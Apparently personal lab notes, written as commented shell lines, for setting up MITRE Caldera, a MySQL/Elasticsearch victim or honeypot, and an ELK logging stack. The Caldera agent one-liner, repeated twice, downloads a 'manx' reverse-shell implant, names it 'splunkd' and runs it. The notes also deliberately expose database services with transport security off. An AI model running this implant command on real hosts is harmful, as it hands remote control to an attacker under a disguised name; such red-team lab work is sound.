# caldera



# git clone https://github.com/mitre/caldera.git --recursive
# cd caldera
# pip3 install -r requirements.txt
# python3 server.py --insecure --build

# caldera cunf
# server="http://0.0.0.0:8888";socket="0.0.0.0:7010";contact="tcp";curl -s -X POST -H "file:manx.go" -H "platform:linux" $server/file/download > splunkd;chmod +x splunkd;./splunkd -http $server -socket $socket -contact $contact -v
# server="http://0.0.0.0:8888";socket="0.0.0.0:7010";contact="tcp";curl -s -X POST -H "file:manx.go" -H "platform:linux" $server/file/download > splunkd;chmod +x splunkd;./splunkd -http $server -socket $socket -contact $contact -v

# node.js
# curl -fsSL https://deb.nodesource.com/setup_16.x | sudo -E bash -
# sudo apt install -y nodejs

# golang-go
# sudo apt install golang -y  
# wget https://go.dev/dl/go1.19.13.linux-amd64.tar.gz 

# mysql 
# sudo apt update && sudo apt upgrade -y
# sudo apt install mysql-server -y
# mysql --version
# sudo nano /etc/mysql/mysql.conf.d/mysqld.cnf
# bind-address = 0.0.0.0
# require_secure_transport = OFF
# sudo systemctl restart mysql
# sudo mysql

# Install Java (required by Elasticsearch)

# sudo apt update
# sudo apt install openjdk-11-jdk -y
# java -version

# Elasticsearch

# wget -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch | sudo apt-key add -
# sudo sh -c 'echo "deb https://artifacts.elastic.co/packages/7.x/apt stable main" > /etc/apt/sources.list.d/elastic-7.x.list'
# sudo apt update
# sudo apt install elasticsearch -y

# Configure Elasticsearch

# sudo nano /etc/elasticsearch/elasticsearch.yml
# # Network settings
# network.host: 0.0.0.0
# http.port: 9200

# Enable Elasticsearch Service

# sudo systemctl start elasticsearch
# sudo systemctl enable elasticsearch
# sudo systemctl status elasticsearch

# Allow Traffic on Port 9200 (Firewall Configuration)

# sudo ufw allow 9200
# sudo ufw reload
                            
# Verify Elasticsearch Access

# curl http://<your-server-ip>:9200

# Install and Set Up ELK Stack

# sudo apt update
# sudo apt install elasticsearch
# network.host: localhost
# sudo systemctl start elasticsearch
# sudo systemctl enable elasticsearch

# Install Logstash

# sudo apt install logstash

# Install Kibana:

# sudo apt install kibana
# server.host: "localhost"
# elasticsearch.hosts: ["http://localhost:9200"]
# sudo systemctl start kibana
# sudo systemctl enable kibana

# Install Filebeat:
# sudo apt install filebeat


# Configure Filebeat on Victim and Honeypot
# sudo filebeat modules enable mysql
# sudo filebeat modules enable elasticsearch

# Edit Filebeat Configuration:

# output.elasticsearch:
#   hosts: ["<ELK_Server_IP>:9200"]

# Start Filebeat

# sudo systemctl start filebeat
# sudo systemctl enable filebeat

# Test Connectivity

# curl -X GET "http://<ELK_Server_IP>:9200/_cat/indices?v"

# Set Up Logstash

# input {
#   beats {
#     port => 5044
#   }
# }
# filter {
#   # Add any log parsing or enrichment logic here
# }
# output {
#   elasticsearch {
#     hosts => ["http://localhost:9200"]
#     index => "project-logs-%{+YYYY.MM.dd}"
#   }
# }

# Start Logstash

# sudo systemctl start logstash
# sudo systemctl enable logstash

# Visualize Data in Kibana

# cd /etc/kibana
# sudo nano kibana.yml
# sudo vi kibana.yml

# Locate the Required Settings: Find the lines for server.host and elasticsearch.hosts

# server.host: "localhost"
# elasticsearch.hosts: ["http://localhost:9200"]

# Restart the Kibana Service

# sudo systemctl restart kibana

# Verify the Configuration

# sudo systemctl status kibana
